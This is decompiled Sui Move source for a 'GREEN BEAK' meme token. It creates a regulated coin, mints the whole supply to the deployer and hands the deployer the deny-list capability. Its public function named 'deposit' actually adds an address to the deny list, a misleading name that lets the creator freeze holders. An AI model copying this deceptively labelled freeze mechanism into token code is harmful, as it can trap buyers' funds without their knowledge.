module 0x479169ced64ec498534c49467c30c4212abc6ed31619691bca0b5d831f994688::beak {
    struct BEAK has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BEAK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BEAK>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: BEAK, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/ethereum/0xbeac671ee661461b7fcd786ece1b2f37af2a99f8.png?size=lg&key=2b697e                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<BEAK>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"BEAK    ")))), trim_right(b"GREEN BEAK                      "), trim_right(b"Landwolf's ultimate partner in chaos! From soccer star to Vegas legend, Greenbeak lives life fast and loose with no regrets. Wild nights, big wins, and mayhem guaranteed.                                                                                                                                                      "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BEAK>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BEAK>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<BEAK>>(0x2::coin::mint<BEAK>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BEAK>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

